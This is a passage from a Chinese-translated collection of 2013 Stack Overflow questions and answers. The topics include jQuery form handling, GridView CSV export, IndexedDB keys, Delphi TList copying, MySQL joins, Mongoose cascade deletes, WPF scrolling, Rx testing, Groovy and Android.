    ESN Start:<input type="text" id="ESNStart" name="ESNStart" size="10" /> <br />
    ESN End: <input type="text" id="ESNStart" name="ESNStart" size="10" /> <br />
    UnitName:<input type="text" id="STxName" name="STxName" size="30"  />  <br />  
     Unit Model:   <select name="STxName" id="ddl_StxName">
    <option value="stx2">STX2</option>
    <option value="stm3" selected>STM3</option>
    <option value="acutec">Acutec</option>
     <option value="trackpack">Trackpack</option>
    <option value="mmt">MMT</option>
    <option value="smartone">Smartone</option>
    <option value="smartoneb" >SmartOneB</option>
    </select> <br />
    RTU Model Type:
     <select name="rtumodel" id ="ddl_rtumodel">
    <option value="globalstar">GlobalStar</option>
    <option value="both">Both</option>
    <option value="comtech">Comtech</option>
    <option value="stmcomtech">STMComtech</option>
    </select> <br />
    <input type="submit" value ="submit"  />
    </form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T05:31:51.010

嗯，我的直觉是使用事件，而不是通过 setInterval 进行所有这些持续的背景检查......

像这样的东西

```
$(":text").css("border", "2px solid red");
$(":text").keyup(function(){
  var enteredData = $(this).val()
  if (enteredData == "") {
    $(this).css("border", "2px solid red");
  } else {
    $(this).css("border", "inherit");
  }
  if ($(this).attr("id") == "ESNList"){
    esnList = parseInt(enteredData);
    switch (true){
      case ( esnList >= 986329 && esnList <= 999999):
          $("#ddl_StxName").val("stx2");
          $("#ddl_rtumodel").val("globalstar");
          break;
      case ( esnList >= 660000 && esnList <= 699999):
          $("#ddl_StxName").val("mmt");
          $("#ddl_rtumodel").val("globalstar");
          break;
      case ( esnList >= 200000 && esnList <= 299999):
          $("#ddl_StxName").val("stm3");
          $("#ddl_rtumodel").val("stmcomtech");
          break;
      case ( esnList >= 1202114 && esnList <= 1299999):
          $("#ddl_StxName").val("smartone");
          $("#ddl_rtumodel").val("globalstar");
          break;
    }

  }
}); 
```

保持传统，这里有一个[小提琴](http://jsfiddle.net/kentcoast/tJC4Y/11/)

我认为，如果这是我的项目，我可能会考虑制作对象和数组来管理产品范围并使用它们来构建下拉列表和事件 - 从长远来看，更容易管理，需要多做一些前期工作。

# c# - 手动 GridView 但无法将内容导出到 CSV 文件

> ID：14348495
> 
> 赞同：1
> 
> 时间：2013-01-15T22:57:41.663
> 
> 标签：c#, .net, function, gridview

我创建了一个函数来获取查询字符串并`GridView`在`.aspx`页面中创建一个。这工作正常。我有一个导出到`csv`返回空文件的函数。`SQLDataSource`当我创建和`GridView`使用自动化工具时，我毫无问题地使用了这个功能。我相信导出到`csv`函数并没有从`gridview`网页上的动态中获取数据。我看不出我在哪里犯了错误。我怀疑我的功能很糟糕，因为我没有正确返回`GridView`.

```
protected void Page_Load(object sender, EventArgs e)
{
    btnBack.Click += new EventHandler(btnBack_Click);
    btnCSVDownload.Click += new EventHandler(btnCSVDownload_Click);

    lblLabel.Text = "some text";

    string selQuery = "SELECT * FROM Employees";

    SqlSelect(selQuery);
}

public string SqlSelect(string selStatement)
{
    lblSelectStatement.Text = selStatement;

    SqlConnection MyConnection = new SqlConnection();
    MyConnection.ConnectionString = ConfigurationManager.ConnectionStrings["datasource"].ConnectionString;
    SqlCommand MyCommand = new SqlCommand();
    MyCommand.CommandText = selStatement;
    MyCommand.CommandType = CommandType.Text;
    MyCommand.Connection = MyConnection;
    DataTable MyTable = new DataTable();
    SqlDataAdapter MyAdapter = new SqlDataAdapter();
    MyAdapter.SelectCommand = MyCommand;
    MyAdapter.Fill(MyTable);
    GridView1.DataSource = MyTable.DefaultView;
    GridView1.DataBind();
    MyAdapter.Dispose();
    MyCommand.Dispose();
    MyConnection.Dispose();

    return lblSelectStatement.Text;
}

protected void btnCSVDownload_Click(object sender, EventArgs e)
{  
    ExportToCsv(GridView1);
}

public void ExportToCsv(GridView grv)
{
    Response.Clear();
    Response.Buffer = true;
    Response.AddHeader("content-disposition",
    "attachment;filename=export.csv");
    Response.Charset = "";
    Response.ContentType = "application/text";

    grv.AllowPaging = false;
    grv.DataBind(); 

    StringBuilder sb = new StringBuilder();
    for (int k = 0; k < grv.Columns.Count; k++)
    {
        sb.Append(grv.Columns[k].HeaderText + ','); //add separator
    }
    sb.Append("\r\n"); //append new line
    for (int i = 0; i < grv.Rows.Count; i++)
    {
        for (int k = 0; k < grv.Columns.Count; k++)
        {
            grv.Rows[i].Cells[k].Text = ('"' + grv.Rows[i].Cells[k].Text + '"'); //add separator
            sb.Append(grv.Rows[i].Cells[k].Text + ',');
        }
        sb.Append("\r\n"); //append new line
    }
    Response.Output.Write(sb.ToString());
    Response.Flush();
    Response.End();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T14:13:58.560

确保您的 gridview 字段不是自动生成的，并且它们是绑定字段。

# indexeddb - 在 IndexedDB 中向 objectStore 添加记录时如何指定键？

> ID：14348497
> 
> 赞同：6
> 
> 时间：2013-01-15T22:58:06.497
> 
> 标签：indexeddb

试图学习 IndexedDB 的概念和 API，我正在努力弄清楚如何使用 IDBObjectStore.add 方法为 objectStore 指定键。根据规范，第一个参数是值，第二个可选参数是键。当我提供一个具有 Bar 作为值的属性的对象（它是一个对象）时，我可以添加一条记录，但是当我尝试通过第二个参数通过对象传递键时，添加尝试失败并且详细信息我得到的是：

代码：5。消息：DataError：DOM IDBDatabase 异常 5。名称：DataError。堆栈：错误：提供的数据不符合要求。在 IDBOpenDBRequest.dbOpenRequest.onsucces

代码示例如下：

```
var dbOpenRequest = window.indexedDB.open("sandbox")

    dbOpenRequest.onupgradeneeded = function (event) {
        var db = dbOpenRequest.result;

        var fooObjStore = db.createObjectStore("Foo", {
            keyPath: "Bar",
            autoIncrement: false
        });
    }

    dbOpenRequest.onsuccess = function (event) {
        var db = dbOpenRequest.result;
        var transaction = db.transaction(["Foo"], "readwrite");
        transaction.oncomplete = function () {
            console.log("Transaction complete");
        }            

        transaction.onerror = function (event) {
            console.error("Transaction error! " + event.target.webkitErrorMessage);
        }

        var fooObjStore = transaction.objectStore("Foo");
        try {
            //Works
            var fooRequest = pipelineObjStore.add({ data: "myData", Bar: "1" });

            //Fails
            fooRequest = pipelineObjStore.add({ data: "myData" }, "2" );

            //Fails
            fooRequest = pipelineObjStore.add({ data: "myData" }, { Bar: "3" });
        }
        catch (e) {
            console.error("Code: " + e.code
                + ". \nMessage: " + e.message
                + ". \nName: " + e.name
                + ". \nStack: " + e.stack);
        }

        fooRequest.onsuccess = function (event) {
            console.log("Pipeline request successful");
        }

        fooRequest.onerror = function (event) {
            console.error("Pipeline request error. " + event.target.webkitErrorMessage);
        }
    }

    dbOpenRequest.onerror = function (event) {
        console("Error ");
    } 
```

我最终想要做的是创建一个 objectStore，其中包含其值的字符串并单独提供密钥。是否可以这样做，或者我是否必须提供一个对象，该对象包含我的字符串数据作为属性的一部分和另一个具有键的属性？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-16T00:19:53.657

您正在使用内联键。但是您的情况需要[带有 out-of-line key 的对象存储](http://www.w3.org/TR/IndexedDB/#object-store-concept)。

```
var fooObjStore = db.createObjectStore("Foo", {
  autoIncrement: false 
}); 
```

然后你用你的外部键[添加记录，这里是“1”。](http://www.w3.org/TR/IndexedDB/#widl-IDBObjectStore-add-IDBRequest-any-value-any-key)

```
var fooRequest = fooObjStore.add({data: "myData"}, "1"); 
```

# delphi - 我如何使用 Move 过程来填充 TList 元素？

> ID：14348498
> 
> 赞同：4
> 
> 时间：2013-01-15T22:58:07.810
> 
> 标签：delphi, delphi-xe2

我需要将存储在字节数组中的数据移动到位于 TList 中的一组记录中，但出现此错误

> E2197 常量对象不能作为 var 参数传递

此代码重现了该问题。

```
uses
  System.Generics.Collections,
  System.SysUtils;

type
  TData = record
    Age : Byte;
    Id  : Integer;
  end;

//this code is only to show the issue, for simplicity i'm filling only the first  
//element of the TList but the real code needs fill N elements from a very big array.  
var
  List : TList<TData>;
  P : array [0..1023] of byte;
begin
  try
    List:=TList<TData>.Create;
    try
      List.Count:=1;
      //here i want to move the content of the P variable to the element 0
      Move(P[0],List[0], SizeOf(TData));

    finally
      List.Free;
    end;

  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end. 
```

我如何将缓冲区的内容复制到 TList 元素

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:00:08.233

在 XE2 中，内部存储`TList<T>`是不透明和隐藏的。您无法通过正常方式访问它。对列表元素的所有访问都被复制——对底层存储的引用不可用。所以你不能使用`Move`. 如果你想要一个可以blit到的结构，你应该考虑一个动态数组，`TArray<T>`.

您总是可以使用实现类助手的技巧来`TList<TData>`公开私有变量`FItems`。这很hacky，但会按照你的要求做。

```
type
  __TListTData = TList<TData>;
  //defeat E2086 Type 'TList<T>' is not yet completely defined

type
  TListTDataHelper = class helper for TList<TData>
    procedure Blit(const Source; Count: Integer);
  end;

procedure TListTDataHelper.Blit(const Source; Count: Integer);
begin
  System.Move(Source, Pointer(FItems)^, Count*SizeOf(Self[0]));
end; 
```

我猜你可能想在里面加入一些参数检查`TListTDataHelper.Blit`，但我会把它留给你。

如果您使用的是 XE3，则可以`TList<T>`使用该[`List`](http://docwiki.embarcadero.com/Libraries/XE3/en/System.Generics.Collections.TList.List)属性访问私有存储。

```
Move(P, Pointer(List.List)^, N*SizeOf(List[0])); 
```

如果您不需要 blit 并且可以使用 for 循环，请执行以下操作：

```
type
  PData = ^TData;
var
  i: Integer;
  Ptr: PData;
....
List.Count := N;
Ptr := PData(@P);
for i := 0 to List.Count-1 do
begin
  List[i] := Ptr^;
  inc(Ptr);
end; 
```

但我将您的问题解释为您希望避免此选项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T01:35:46.157

而不是 using `Move()`，而是尝试使用`TList<T>.Items[]`属性设置器，让编译器和 RTL 为您处理复制：

```
type
  PData = ^TData;
  ...

List[0] := PData(@P[0])^; 
```

# mysql - 添加另一个子查询

> ID：14348507
> 
> 赞同：0
> 
> 时间：2013-01-15T22:58:42.377
> 
> 标签：mysql

我将此查询作为我的主要查询，我使用成员表中的所有记录，并从评论和聊天框中选择列。

```
SELECT members.*, 
       a.commenter_id, 
       b.user_id, 
       a.comcount, 
       b.chatcount 
FROM   members 
       LEFT JOIN (SELECT commenter_id, 
                         Count(*) comCount 
                  FROM   comments 
                  GROUP  BY commenter_id) a 
              ON members.id = a.commenter_id 
       LEFT JOIN (SELECT user_id, 
                         Count(*) chatCount 
                  FROM   chat_box 
                  GROUP  BY user_id) b 
              ON members.id = b.user_id 
WHERE  members.id = '290' 
```

我想将此查询添加到上面

```
SELECT Count(friend_id) AS totFriend, 
       friend_id        AS fi, 
       logged_user_id   AS user, 
       friend_accepted  AS fa 
FROM   member_friends 
WHERE  logged_user_id = '1' 
       AND friend_id = '290' 
```

是否可以将其添加到混合中而不会导致任何错误？我自己尝试过，但我可能只是让自己陷入更深层次的问题。如果可能有人可以帮助我这样做，谢谢:)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:07:35.720

如果您有办法将最后一个查询加入到您的`members`表中，那么您应该能够使用：

```
SELECT members.*, 
  a.commenter_id, 
  b.user_id, 
  a.comcount, 
  b.chatcount,
  c.totFriend
FROM   members 
LEFT JOIN 
(
  SELECT commenter_id, 
    Count(*) comCount 
  FROM   comments 
  GROUP  BY commenter_id
) a 
  ON members.id = a.commenter_id 
LEFT JOIN 
(
  SELECT user_id, 
    Count(*) chatCount 
  FROM   chat_box 
  GROUP  BY user_id
) b 
 ON members.id = b.user_id 
LEFT JOIN
(
  SELECT Count(friend_id) AS totFriend, 
       friend_id        AS fi, 
       logged_user_id   AS user, 
       friend_accepted  AS fa 
  FROM   member_friends 
  WHERE  logged_user_id = '1' 
   AND friend_id = '290'
) c
  on members.id = c.friend_id
WHERE  members.id = '290' 
```

# mongodb - Mongoose中的级联样式删除

> ID：14348516
> 
> 赞同：56
> 
> 时间：2013-01-15T22:59:29.153
> 
> 标签：mongodb, mongoose

有没有办法在 Mongoose 中删除父级的所有子级，类似于使用 MySQL 的外键？

例如，在 MySQL 中，我会分配一个外键并将其设置为删除时级联。因此，如果我要删除一个客户端，所有应用程序和相关用户也将被删除。

从顶层：

1.  删除客户端
2.  删除抽奖
3.  删除提交

抽奖和提交都有一个 client_id 字段。Submissions 有一个用于sweepstakes_id 和client_id 的字段。

现在，我正在使用以下代码，我觉得必须有更好的方法。

```
Client.findById(req.params.client_id, function(err, client) {

    if (err)
        return next(new restify.InternalError(err));
    else if (!client)
        return next(new restify.ResourceNotFoundError('The resource you requested could not be found.'));

    // find and remove all associated sweepstakes
    Sweepstakes.find({client_id: client._id}).remove();

    // find and remove all submissions
    Submission.find({client_id: client._id}).remove();

    client.remove();

    res.send({id: req.params.client_id});

}); 
```

* * *

## 回答 #1

> 赞同：131
> 
> 时间：2013-01-16T00:04:38.743

这是 Mongoose`'remove'` [中间件](http://mongoosejs.com/docs/middleware.html)的主要用例之一。

```
clientSchema.pre('remove', function(next) {
    // 'this' is the client being removed. Provide callbacks here if you want
    // to be notified of the calls' result.
    Sweepstakes.remove({client_id: this._id}).exec();
    Submission.remove({client_id: this._id}).exec();
    next();
}); 
```

这样，当您调用`client.remove()`此中间件时，会自动调用以清理依赖项。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2017-06-03T19:50:23.763

如果您的引用以其他方式存储，例如，`client`有一个数组`submission_ids`，那么以与接受的答案类似的方式，您可以在 上定义以下内容`submissionSchema`：

```
submissionSchema.pre('remove', function(next) {
    Client.update(
        { submission_ids : this._id}, 
        { $pull: { submission_ids: this._id } },
        { multi: true })  //if reference exists in multiple documents 
    .exec();
    next();
}); 
```

**这将从客户端的** 引用数组中删除**提交的**id 。**`submission.remove()`**

 *** * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-02-20T17:08:54.183

这是我发现的另一种方式

```
submissionSchema.pre('remove', function(next) {
    this.model('Client').remove({ submission_ids: this._id }, next);
    next();
}); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2021-10-20T21:44:25.993

我注意到这里的所有答案都`pre`分配给了架构，而不是`post`.

我的解决方案是这样的：（使用猫鼬6+）

```
ClientSchema.post("remove", async function(res, next) { 
    await Sweepstakes.deleteMany({ client_id: this._id });
    await Submission.deleteMany({ client_id: this._id });
    next();
}); 
```

根据定义 post 在流程结束后执行`pre => process => post`。

现在，您可能想知道这与此处提供的其他解决方案有何不同。如果找不到服务器错误或该客户端的 ID 怎么办？在 pre 上，它会在删除过程`sweeptakes`开始`submissions`之前删除所有`client`. 因此，如果出现错误，最好将其他文档级联删除一次，`client`否则主文档会被删除。

async 和 await 在这里是可选的。但是，它对大数据很重要。这样如果删除进度仍在进行，用户就不会得到那些“将被删除”的级联文档数据。

最后，我可能是错的，希望这对他们的代码有所帮助。**

# wpf - scrollviewer 的子元素阻止使用鼠标滚轮滚动？

> ID：14348517
> 
> 赞同：39
> 
> 时间：2013-01-15T22:59:29.723
> 
> 标签：wpf, event-handling, listbox, scrollviewer, mousewheel

我在让鼠标滚轮滚动以在以下 XAML 中工作时遇到问题，为了清楚起见，我对其进行了简化：

```
<ScrollViewer
HorizontalScrollBarVisibility="Visible"
VerticalScrollBarVisibility="Visible"
CanContentScroll="False"
>
    <Grid
    MouseDown="Editor_MouseDown"
    MouseUp="Editor_MouseUp"
    MouseMove="Editor_MouseMove"
    Focusable="False"
    >
        <Grid.Resources>
            <DataTemplate
            DataType="{x:Type local:DataFieldModel}"
            >
                <Grid
                Margin="0,2,2,2"
                >
                    <TextBox
                    Cursor="IBeam"
                    MouseDown="TextBox_MouseDown"
                    MouseUp="TextBox_MouseUp"
                    MouseMove="TextBox_MouseMove"
                    />
                </Grid>
            </DataTemplate>
        </Grid.Resources>
        <ListBox
        x:Name="DataFieldListBox"
        ItemsSource="{Binding GetDataFields}"
        SelectionMode="Extended"
        Background="Transparent"
        Focusable="False"
        >
            <ListBox.ItemsPanel>
                <ItemsPanelTemplate>
                    <Canvas />
                </ItemsPanelTemplate>
            </ListBox.ItemsPanel>
            <ListBox.ItemContainerStyle>
                <Style
                TargetType="ListBoxItem"
                >
                    <Setter
                    Property="Canvas.Left"
                    Value="{Binding dfX}"
                    />
                    <Setter
                    Property="Canvas.Top"
                    Value="{Binding dfY}"
                    />
                </Style>
            </ListBox.ItemContainerStyle>
        </ListBox>
    </Grid>
</ScrollViewer> 
```

从视觉上看，结果是某个已知大小的区域，其中`DataField`从集合中读取的 s 可以用`TextBox`具有任意位置、大小等的 es 表示。如果`ListBox`'s 样式的“区域”太大而无法一次全部显示，则可以进行水平和垂直滚动，但只能使用滚动条。

为了更好的人体工程学和理智，鼠标滚轮滚动应该是可能的，并且通常`ScrollViewer`会自动处理它，但`ListBox`似乎正在处理这些事件，这样父级`ScrollViewer`永远不会看到它们。到目前为止，我只能`IsHitTestVisible=False`为 the`ListBox`或 parent设置滚轮滚动`Grid`，但当然，此后子元素的鼠标事件都不起作用。

我可以做些什么来确保`ScrollViewer`看到鼠标滚轮事件同时保留其他子元素？

编辑：我刚刚了解到`ListBox`有一个内置的`ScrollViewer`可能从父级窃取轮事件，`ScrollViewer`并且指定控制模板可以禁用它。如果可以解决问题，我将更新此问题。

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2013-04-19T17:21:08.653

您还可以创建一个行为并将其附加到父控件（滚动事件应该在其中冒泡）。

```
// Used on sub-controls of an expander to bubble the mouse wheel scroll event up 
public sealed class BubbleScrollEvent : Behavior<UIElement>
{
    protected override void OnAttached()
    {
        base.OnAttached();
        AssociatedObject.PreviewMouseWheel += AssociatedObject_PreviewMouseWheel;
    }

    protected override void OnDetaching()
    {
        AssociatedObject.PreviewMouseWheel -= AssociatedObject_PreviewMouseWheel;
        base.OnDetaching();
    }

    void AssociatedObject_PreviewMouseWheel(object sender, MouseWheelEventArgs e)
    {
        e.Handled = true;
        var e2 = new MouseWheelEventArgs(e.MouseDevice, e.Timestamp, e.Delta);
        e2.RoutedEvent = UIElement.MouseWheelEvent;
        AssociatedObject.RaiseEvent(e2);
    }
}

<SomePanel>
            <i:Interaction.Behaviors>
                <viewsCommon:BubbleScrollEvent />
            </i:Interaction.Behaviors>
</SomePanel> 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-01-16T17:05:20.537

指定不包含 a 的 a`ControlTemplate`可以解决问题。有关更多信息，请参阅[此答案](https://stackoverflow.com/a/1739298/1457236)和这两个 MSDN 页面：`Listbox``ScrollViewer`

[控制模板](http://msdn.microsoft.com/en-us/library/system.windows.controls.controltemplate(v=vs.100).aspx)

[列表框样式和模板](http://msdn.microsoft.com/en-us/library/ms754242(v=vs.100).aspx)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-06-08T11:23:09.123

另一种实现方式是创建自己的 ScrollViewer，如下所示：

```
public class MyScrollViewer : ScrollViewer
{
    protected override void OnMouseWheel(MouseWheelEventArgs e)
    {
        var parentElement = Parent as UIElement;
        if (parentElement != null)
        {
            if ((e.Delta > 0 && VerticalOffset == 0) ||
                (e.Delta < 0 && VerticalOffset == ScrollableHeight))
            {
                e.Handled = true;

                var routedArgs = new MouseWheelEventArgs(e.MouseDevice, e.Timestamp, e.Delta);
                routedArgs.RoutedEvent = UIElement.MouseWheelEvent;
                parentElement.RaiseEvent(routedArgs);
            }
        }

        base.OnMouseWheel(e);
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-05-21T11:01:30.133

我知道这有点晚了，但我有另一个对我有用的解决方案。我将我的堆栈面板/列表框切换为项目控件/网格。不知道为什么滚动事件可以正常工作，但在我的情况下它们可以正常工作。

```
<ScrollViewer VerticalScrollBarVisibility="Auto" PreviewMouseWheel="ScrollViewer_PreviewMouseWheel">
                <StackPanel Orientation="Vertical">
                    <ListBox ItemsSource="{Binding DrillingConfigs}" Margin="0,5,0,0">
                        <ListBox.ItemTemplate>
                            <DataTemplate> 
```

变成了

```
<ScrollViewer VerticalScrollBarVisibility="Auto" PreviewMouseWheel="ScrollViewer_PreviewMouseWheel">
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="*" />
            <RowDefinition Height="Auto" />
        </Grid.RowDefinitions>
        <ItemsControl ItemsSource="{Binding DrillingConfigs}" Margin="0,5,0,0" Grid.Row="0">
            <ItemsControl.ItemTemplate>
                <DataTemplate> 
```

# system.reactive - 为什么我的 WCF 异步与 Rx 单元测试不稳定？

> ID：14348518
> 
> 赞同：0
> 
> 时间：2013-01-15T22:59:37.190
> 
> 标签：system.reactive, reactiveui

我在 MVVM 项目中使用 Rx 和 RxUI，并且有一个视图模型可以从 WCF 服务异步查询其数据。在单元测试中，我创建了一个模拟对象，它返回一个具有预期值的任务。

这是我的视图模型的大致概念

```
public class ViewModel : ReactiveObject
{
    private IContext _context;

    public ViewModel(IContext context)
    {
        _context = context;

        Observable.FromAsync(() => _context.WcfServiceCall())
              .Subscribe(result => {
                   Children.AddRange(results.Select(r => new ChildViewModel(r).ToList()));
               });
     }

     public ObservableCollection<ChildViewModel> { get; private set;}
} 
```

我的单元测试看起来像这样

```
[TestFixture]
public class ViewModelTest : AssertionHelper
{
    [Test]
    public void ShouldSetChildren()
    {
        var c = new Mock<IContext>();
        c.Setup(q => q.WcfServiceCall())
            .Returns(Task.Run(() => new []{ 1,2,3,4,5,6 })):

        var vm = new ViewModel(c.Object);
        var p = vm.Children.First(); // this call sometimes fails

        ... 
     }
} 
```

我遇到的问题是，我有超过 400 个测试可以做这种事情，而且它们大部分时间都可以工作，但是我随机得到失败的测试，一次一两个，报告序列没有值。这是不可预测和随机的。我可以在失败后再次运行测试并且全部成功。[我已按照此处](http://blog.paulbetts.org/index.php/2011/01/18/testing-your-viewmodels-using-time-travel-and-reactiveui/)所述添加了 TestScheduler，但问题仍然存在。

有没有更好的方法来测试进行异步方法调用的方法？

根据 Paul Bett 的输入进行编辑：我看到 FromAsync 不采用 IScheduler 参数，但我确实有可用的 SubscribeOn 和 ObserveOn。

或者，我可以直接调用 WCF 异步方法并将返回的 Task 转换为 observable。我不确定我是否理解何时使用 Observable.FromAsync 与不使用它更合适。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:45:37.790

是否`Observable.FromAsync`带`IScheduler`参数？它是您的测试调度程序吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T19:11:40.493

我意识到我的单元测试是不正确的，因为它们接触了太多的移动部件。我有一些测试可以验证模拟的 Web 服务调用是否按预期进行，我真的不应该在不关注该测试点的测试中包含这种复杂性。

导航到视图模型时，我正在调用 wcf 服务。这是我的视图模型的更好表示，在指定 IScheduler 方面稍作更改：

```
public class ViewModel : ReactiveObject, IRoutableViewModel
{
    private IContext _context;
    public ViewModel(IContext context)
    {
        _context = context;
        Weeks = new ReactiveCollection<WeekViewModel>();

        this.WhenNavigatedTo(() =>
        {
            _context.Service.GetWeeksAsync()
                .ToObservable()
                .ObserveOn(RxApp.DeferredScheduler)
                .Subscribe(result =>
                {
                    Weeks.AddRange(result.Select(w => WeekViewModel(w)));
                });
        });

        // ...
    }

    public ReactiveCollection<WeekViewModel> Weeks { get; private set; }
} 
```

我现在不是设置上下文来填充 Weeks 集合，然后使用路由器导航到 ViewModel，而是在单元测试中将对象添加到 Weeks 集合并跳过导航和异步 Web 服务调用。据我所知，这减少了测试，消除了不稳定性，并减少了测试套件的执行时间。

所以我的单元测试看起来像这样

```
[TestFixture]
public class ViewModelTest : AssertionHelper
{
    [Test]
    public void ShouldSetChildren()
    {
        var c = new Mock<IContext>();
        var vm = new ViewModel(c.Object);
        vm.Children.AddRange((new []{1,2,3,4,5,6}).Select(i => new ChildViewModel(i)));

        var p = vm.Children.First(); // this is valid now - no timing issues

        ... 
    }
} 
```

该代码在应用程序中运行正确，但在测试运行程序中存在问题，因此我相信这可以解决我的直接问题。

# groovy - 带参数的 Groovy 函数

> ID：14348526
> 
> 赞同：0
> 
> 时间：2013-01-15T23:00:10.310
> 
> 标签：groovy, closures, categories

我有一个类正在解析基于 csv 的文件，但我想为令牌符号设置一个参数。请让我知道如何更改功能并在程序上使用该功能。

```
class CSVParser{  
  static def parseCSV(file,closure) {  
        def lineCount = 0
        file.eachLine() { line ->  
            def field = line.tokenize(';')  
            lineCount++  
            closure(lineCount,field)  
        }  
    }  
} 

use(CSVParser.class) {  
    File file = new File("test.csv")  
    file.parseCSV { index,field ->  
        println "row: ${index} | ${field[0]} ${field[1]} ${field[2]}"  
    }  
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:10:39.590

您必须在`file`和参数之间添加`closure`参数。

当您使用静态方法创建类别类时，第一个参数是调用该方法的对象，因此`file`必须是第一个。

将闭包作为最后一个参数允许闭包的左大括号跟在没有括号的函数调用之后的语法。

下面是它的外观：

```
class CSVParser{  
    static def parseCSV(file,separator,closure) {  
        def lineCount = 0
        file.eachLine() { line ->  
            def field = line.tokenize(separator)  
            lineCount++  
            closure(lineCount,field)  
        }  
    }  
} 

use(CSVParser) {  
    File file = new File("test.csv")  
    file.parseCSV(',') { index,field ->  
        println "row: ${index} | ${field[0]} ${field[1]} ${field[2]}"  
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:07:53.077

只需将分隔符作为第二个参数添加到`parseCSV`方法中：

```
class CSVParser{  
  static def parseCSV(file, sep, closure) {  
    def lineCount = 0
    file.eachLine() { line ->  
      def field = line.tokenize(sep)  
      closure(++lineCount, field)  
    }  
  }  
} 

use(CSVParser.class) {  
  File file = new File("test.csv")  
  file.parseCSV(";") { index,field ->  
    println "row: ${index} | ${field[0]} ${field[1]} ${field[2]}"  
  }  
} 
```

# android - 使用 phonegap 和 jQuery mobile 初始化 iscroll

> ID：14348530
> 
> 赞同：0
> 
> 时间：2013-01-15T23:00:24.750
> 
> 标签：android, jquery, cordova, jquery-mobile, iscroll

我已经使用 phonegap 和 jquery mobile 构建了一个项目，并且 iscroll 在第一页上完美运行。但是在我的第二页上 iscroll 没有运行。有人能告诉我你如何在 JQM 的页面上初始化一个 jquery 脚本吗？我对这两个平台都很陌生，并认为这可能是一个简单的错误！谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T10:04:18.207

我从未使用过phonegap，但我也在构建一个JQM-webapp，所以我希望这对你有用。

iScroll 似乎会导致尝试在 JQM 中实现它的几个问题。这就是他们提出[jquery.mobile.iscrollview](https://github.com/watusi/jquery-mobile-iscrollview)的原因，它基本上使 iScroll javascript 适应 jQuery Mobile 环境。

只需包含脚本并添加`data-iscroll=""`到您的 div 中。并按给定顺序包含所有脚本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T20:14:22.750

checkDOMChanges：设置为 false 以防止 DOM 更改时自动刷新。如果您关闭此功能，则每次修改 DOM 时都必须以编程方式调用 iScroll.refresh() 函数。如果您的代码进行了许多后续 DOM 修改，建议将 checkDOMChanges 设置为 false 并仅刷新 iScroll 一次（即：完成所有更改后）。默认为真。

在该页面上查看更多信息：http: [//cubiq.org/iscroll](http://cubiq.org/iscroll)

# python - 检查 GAE Python 中是否存在数据存储区中的实体

> ID：14348531
> 
> 赞同：3
> 
> 时间：2013-01-15T23:00:36.523
> 
> 标签：python, google-app-engine, python-2.7, google-cloud-datastore

我正在尝试创建（类似于）发票号码生成器。但是，由于开办企业时发票可能为零或更多，**您如何知道实体是否存在**？

```
query = "SELECT loanNumber FROM Loans ORDER BY loanNumber DESC LIMIT 1"
loanNumbers = db.GqlQuery(query)

result = loanNumbers.get()

# for loanNumber in loanNumbers:
if loanNumbers is None:
  print "Print the first number"
else:
  print "Print the next number" 
```

错误

```
KindError: No implementation for kind 'Loans' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:32:51.683

现在这里记录了一些不错的元数据帮助函数：[https ://developers.google.com/appengine/docs/python/datastore/metadataentityclasses#get_kinds](https://developers.google.com/appengine/docs/python/datastore/metadataentityclasses#get_kinds)

`Loans`这是在继续查询和其余代码之前进行检查的示例：

```
from google.appengine.ext.db import metadata

my_kinds = metadata.get_kinds() # Returns a list of entity kind names.

if u'Loans' in my_kinds:
    ... 
```

请注意，在实际创建贷款实体之前`my_kinds`不会包含。`Loans`

* * *

如果您需要更多控制，或者更喜欢推出自己的辅助函数，这里有一些示例：[https ://developers.google.com/appengine/docs/python/datastore/metadataqueries#Kind_Queries](https://developers.google.com/appengine/docs/python/datastore/metadataqueries#Kind_Queries)

# android - Android：在另一个活动中的主要活动和片段页面之间共享数据库数据

> ID：14348537
> 
> 赞同：1
> 
> 时间：2013-01-15T23:01:23.930
> 
> 标签：android, database, android-fragments, android-fragmentactivity

我有一个主要活动，它从数据库中读取类别列表并将它们显示在 ListView 中。

单击一个会打开第二个 FragmentActivity，它会在另一个列表中显示该类别中的所有项目。这是通过 Fragment 和 FragmentPagerAdapter 实现的，以允许在类别中滑动。

我的问题是我需要访问片段的 OnCreateView 中的类别数组，以便确定我应该为给定页面显示哪个类别。我遇到的每个寻呼机示例要么只显示例如'page #1'，要么将数据存储在片段中的静态数组中。

目前，我是：

*   遍历主要活动中的光标并将类别存储在数组中；
*   将该数组作为意图中的额外数据传递给第二个活动
*   提取第二个活动中的额外数据并将其存储在类数组中；
*   在返回数组的活动中添加函数 getCategories；
*   在 Fragment 的 OnCreateView 中，调用 getActivity().getCategories() 获取数组

这似乎有点啰嗦，我相信一定有更好的方法来做到这一点。是否有更好的数据传递方式，或者其他访问数据库的方式，所以我只需要读取一次，但可以从主要活动和片段访问数据？

# python - Ruby 中是否有与 yaml.safe_load 等价的东西？

> ID：14348538
> 
> 赞同：4
> 
> 时间：2013-01-15T23:01:39.803
> 
> 标签：python, ruby, security, yaml

